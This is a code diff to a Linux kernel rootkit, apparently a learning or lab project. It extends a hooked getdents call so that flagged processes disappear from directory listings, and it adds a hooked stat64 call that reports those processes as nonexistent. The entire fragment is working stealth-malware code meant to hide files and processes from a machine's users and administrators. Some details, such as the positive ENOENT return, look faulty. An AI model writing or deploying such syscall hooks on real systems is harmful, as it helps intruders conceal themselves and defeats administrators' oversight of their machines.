@@ -34,7 +34,8 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *
 		unsigned char *cur_ref = (unsigned char *)k_dir + offset;
 		ref_dir = (struct linux_dirent64 *)cur_ref;
 
-		if (strstr(ref_dir->d_name, "not_a_rootkit") == NULL) {			
+		if (strstr(ref_dir->d_name, "not_a_rootkit") == NULL &&
+			is_proc_hidden(ref_dir->d_name) == 0) {			
 			/* valid dirent, append it */
 			memcpy((void *)ret_dir+new_len, ref_dir, ref_dir->d_reclen);
 			new_len += ref_dir->d_reclen;
@@ -48,6 +49,25 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *
 	kfree(ret_dir);
 
 	return new_len;
+}
+
+asmlinkage long sys_stat64_new(const char __user *filename,
+				struct stat64 __user *statbuf) {
+	long ret = sys_stat64_original(filename, statbuf);
+	char *k_filename = kmalloc(PATH_MAX, GFP_KERNEL);
+
+	if (k_filename == NULL) {
+		return ret;
+	}
+	copy_from_user(k_filename, filename, PATH_MAX);
+
+	/* find out if the proc should be hidden */
+	if (is_proc_hidden(k_filename)) {
+
+		ret = ENOENT;
+	}
+	kfree(k_filename);
+	return ret;
 }
 
 #define START_SEARCH PAGE_OFFSET
